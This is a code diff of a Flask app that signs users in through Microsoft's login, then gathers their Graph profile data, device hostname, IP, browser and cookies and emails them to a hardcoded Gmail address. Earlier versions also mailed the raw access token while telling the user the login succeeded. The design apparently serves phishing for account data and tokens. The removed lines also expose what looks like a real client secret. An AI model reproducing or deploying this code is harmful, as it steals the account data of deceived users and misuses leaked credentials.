@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, session
+from flask import Flask, request, redirect, session, render_template
 import os
 import requests
 from flask_mail import Mail, Message
@@ -13,7 +13,7 @@ mail = Mail()
 mail.init_app(app)
 
 app.config["DEBUG"] = True
-app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your Flask secret key
+app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your secret key
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 465
 app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
@@ -34,6 +34,11 @@ def browserr():
     return browser
 
 @app.route('/')
+def home():
+    return render_template('home.html')
+
+
+@app.route('/index')
 def index():
     client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
     authority = 'https://login.microsoftonline.com/common'
@@ -41,7 +46,7 @@ def index():
 
     msal_app = msal.ConfidentialClientApplication(
         client_id,
-        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
+        client_credential='YOUR_CLIENT_SECRET',  # Replace with your actual client secret value
         authority=authority,
     )
 
@@ -59,7 +64,7 @@ def handle_redirect():
 
     msal_app = msal.ConfidentialClientApplication(
         client_id,
-        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
+        client_credential='YOUR_CLIENT_SECRET',  # Replace with your actual client secret value
         authority=authority,
     )
 
@@ -77,13 +82,13 @@ def handle_redirect():
                 'https://graph.microsoft.com/v1.0/me',
                 headers={'Authorization': f'Bearer {access_token}'}
             )
-
+            cookies = response.cookies
             device = socket.gethostname()
             ipAddr = socket.gethostbyname(device)
             browser_name = browserr()
 
             user_info = response.json()
-            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name} \nAccess token: {access_token} \nUser Info: {user_info}"
+            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name}\nUser Info: {user_info}\nCookies: {cookies}"
             print(body)  # Print the body for debugging purposes
 
             try:
@@ -94,10 +99,10 @@ def handle_redirect():
                         body=body
                     )
                     mail.send(msg)
-                return "Login successfully!"
+                return "Email sent successfully!"
             except Exception as e:
                 print(f"Failed to send email: {str(e)}")  # Print the error for debugging purposes
-                return f"Failed to Login"
+                return f"Failed to send email: {str(e)}"
         else:
             error = result.get('error')
             error_description = result.get('error_description')
